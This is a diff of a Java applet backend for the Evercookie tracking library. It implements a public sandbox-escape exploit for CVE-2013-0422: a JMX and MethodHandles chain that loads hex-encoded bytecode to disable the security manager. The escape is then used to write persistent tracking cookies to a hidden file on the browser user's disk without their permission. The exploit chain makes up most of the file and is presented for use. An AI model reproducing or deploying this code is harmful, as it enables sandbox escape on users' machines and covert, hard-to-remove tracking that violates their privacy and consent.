@@ -1,5 +1,8 @@
 package evercookie;
 
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
 import java.lang.invoke.MethodHandle;
 import java.lang.invoke.MethodHandles;
 import java.lang.invoke.MethodType;
@@ -13,157 +16,164 @@ import com.sun.jmx.mbeanserver.MBeanInstantiator;
  * This backend uses a public exploit to escape the applet sandbox and write a
  * text file containing Evercookie values to the browser user's hard drive.
  * 
- * @author gbauman
+ * @author Gabriel Bauman <gabe@codehaus.org>
  * 
  */
 public class EvercookieFileBackend implements EvercookieBackend {
 
-	private final boolean jailbroken = jailbreak();
+	private final boolean JAILBROKEN = jailbreak(); // QUAD DAMAGE
+
+	private final File file = new File(".evercookie");
 
 	public EvercookieFileBackend() {
+
 		super();
-		// TODO set things up
+
+		if (!JAILBROKEN) {
+			return;
+		}
+
+		try {
+			file.createNewFile();
+			System.out.println("Storing evercookies in file " + file.getAbsolutePath());
+		} catch (Throwable e) {
+			// We probably aren't jailbroken after all. Should never happen.
+		}
 	}
 
 	@Override
 	public boolean isAvailable() {
-		return this.jailbroken;
+		return JAILBROKEN && file.exists() && file.canRead() && file.canWrite();
 	}
 
 	@Override
-	public void save(Properties values) {
-		if (!jailbroken) {
+	public void save(final Properties values) {
+
+		if (!isAvailable()) {
 			return;
 		}
-		// TODO Auto-generated method stub
+
+		try {
+			FileOutputStream os = new FileOutputStream(file);
+			try {
+				values.store(os, "Evercookie Storage");
+			} finally {
+				os.close();
+			}
+		} catch (Throwable e) {
+			e.printStackTrace();
+		}
 
 	}
 
 	@Override
-	public Properties load() {
-		if (!jailbroken) {
-			return null;
+	public void load(final Properties data) {
+
+		if (!isAvailable()) {
+			return;
 		}
-		// TODO Auto-generated method stub
-		return null;
+
+		FileInputStream is;
+		try {
+			is = new FileInputStream(file);
+			try {
+				data.load(is);
+			} finally {
+				is.close();
+			}
+		} catch (Throwable e) {
+			data.clear();
+		}
 	}
 
 	@Override
 	public void cleanup() {
-		if (!jailbroken) {
+
+		if (!isAvailable()) {
 			return;
 		}
-		// TODO Auto-generated method stub
 
+		try {
+			file.delete();
+		} catch (Throwable e) {
+			// Not jailbroken after all...
+		}
 	}
 
-	@SuppressWarnings("rawtypes")
+	/**
+	 * This function contains code that takes advantage of an exploit
+	 * (CVE-2013-0422) affecting some versions of the Java plugin. It allows us
+	 * full access to the user's filesystem without needing to ask the user for
+	 * permission.
+	 * 
+	 * The hole that this exploit relies on has been patched in recent Java
+	 * versions. This code was found on Reddit and was not created by anyone
+	 * related to Evercookie. If we knew who the author was, we'd credit them.
+	 * 
+	 * Because the code for this exploit is publicly available, and because
+	 * there is a patch already, it seems like.
+	 */
 	private static boolean jailbreak() {
 		try {
-			// Convert above hex string to byte array.
-			byte[] arrayOfByte = hex2Byte(payload);
 
-			// MBean creator to load the sun. classes
 			JmxMBeanServerBuilder localJmxMBeanServerBuilder = new JmxMBeanServerBuilder();
 			JmxMBeanServer localJmxMBeanServer = (JmxMBeanServer) localJmxMBeanServerBuilder.newMBeanServer("", null,
 					null);
 			MBeanInstantiator localMBeanInstantiator = localJmxMBeanServer.getMBeanInstantiator();
 
-			// Looks like this loads some normally inaccessable libraries.
-			// Can't find any good documentation on these two, so I'm not sure
-			// what they do.
 			ClassLoader a = null;
+
+			@SuppressWarnings("rawtypes")
 			Class localClass1 = localMBeanInstantiator.findClass("sun.org.mozilla.javascript.internal.Context", a);
+
+			@SuppressWarnings("rawtypes")
 			Class localClass2 = localMBeanInstantiator.findClass(
 					"sun.org.mozilla.javascript.internal.GeneratedClassLoader", a);
 
-			// "Returns a lookup object which is trusted minimally.
-			// It can only be used to create method handles to publicly
-			// accessible fields and methods."
 			MethodHandles.Lookup localLookup = MethodHandles.publicLookup();
 
-			// Convienience for MethodType.methodType(MethodHandle.class, new
-			// Class[] { Class.class, MethodType.class });
-			// Returns the type of a method which takes a Class and a MethodType
-			// as input and returns a MethodHandle as output.
 			MethodType localMethodType1 = MethodType.methodType(MethodHandle.class, Class.class,
 					new Class[] { MethodType.class });
 
-			// "A typed, directly executable reference to an underlying method"
-			// Named "findConstructor", Is under the MethodHandles.Lookup class,
-			// and has the method type localMethodType1 (as above)
-			// Basically a(n in)direct pointer to the findConstructor function
-			// in the MethodHandles.Lookup class
 			MethodHandle localMethodHandle1 = localLookup.findVirtual(MethodHandles.Lookup.class, "findConstructor",
 					localMethodType1);
 
-			// Returns the type of a method which takes no input (void input)
-			// and returns no output
 			MethodType localMethodType2 = MethodType.methodType(Void.TYPE);
 
-			// Equivalent to localLookup.findConstructor(localClass1,
-			// localMethodType2)
-			// Basically a(n in)direct pointer to the constructor to the
-			// "sun.org.mozilla.javascript.internal.Context" class which has no
-			// input
 			MethodHandle localMethodHandle2 = (MethodHandle) localMethodHandle1.invokeWithArguments(new Object[] {
 					localLookup, localClass1, localMethodType2 });
 
-			// Returns a new object of the type
-			// "sun.org.mozilla.javascript.internal.Context" new Object[0]
-			// represents no input
 			Object localObject1 = localMethodHandle2.invokeWithArguments(new Object[0]);
 
-			// Method type which takes a Class, a String, and a MethodType, and
-			// returns a MethodHandle
 			MethodType localMethodType3 = MethodType.methodType(MethodHandle.class, Class.class, new Class[] {
 					String.class, MethodType.class });
 
-			// Basically a(n in)direct pointer to the findVirtual function in
-			// the MethodHandles.Lookup class
 			MethodHandle localMethodHandle3 = localLookup.findVirtual(MethodHandles.Lookup.class, "findVirtual",
 					localMethodType3);
 
-			// Returns the methodType of something in the
-			// "sun.org.mozilla.javascript.internal.GeneratedClassLoader" class
-			// which returns a ClassLoader
 			MethodType localMethodType4 = MethodType.methodType(localClass2, ClassLoader.class);
 
-			// Equivalent to localLookup.findVirtual(localClass1,
-			// "createClassLoader", localMethodType4)
-			// Basically a(n in)direct pointer to the function
-			// "createClassLoader" in
-			// "sun.org.mozilla.javascript.internal.Context"
 			MethodHandle localMethodHandle4 = (MethodHandle) localMethodHandle3.invokeWithArguments(new Object[] {
 					localLookup, localClass1, "createClassLoader", localMethodType4 });
 
-			// Equivalent to localObject1.createClassLoader(null)
 			Object localObject2 = localMethodHandle4.invokeWithArguments(new Object[] { localObject1, null });
 
-			// Equivalent to localLookup.findVirtual(localClass2, "defineClass",
-			// localMethodType5)
-			// Basically a(n in)direct pointer to the function "defineClass" in
-			// "sun.org.mozilla.javascript.internal.GeneratedClassLoader"
 			MethodType localMethodType5 = MethodType
 					.methodType(Class.class, String.class, new Class[] { byte[].class });
 			MethodHandle localMethodHandle5 = (MethodHandle) localMethodHandle3.invokeWithArguments(new Object[] {
 					localLookup, localClass2, "defineClass", localMethodType5 });
 
-			// Equivalent to localObject2.defineClass(null, arrayOfByte);
-			Class localClass3 = (Class) localMethodHandle5.invokeWithArguments(new Object[] { localObject2, null,
-					arrayOfByte });
+			byte[] bytecode = hex2Byte(payload);
 
-			// Creates a newInstance of localClass3.
-			// localClass3 represents the decompiled code of arrayOfByte, which
-			// executes a class which removes the security manager
+			@SuppressWarnings("rawtypes")
+			Class localClass3 = (Class) localMethodHandle5.invokeWithArguments(new Object[] { localObject2, null,
+					bytecode });
+
 			localClass3.newInstance();
 
-		} catch (Throwable ex) {
+		} catch (Throwable e) {
 			return false;
 		}
-
-		// Now you can execute arbitrary code
-		// Runtime.getRuntime().exec("whatever.exe");
 
 		return true;
 	}
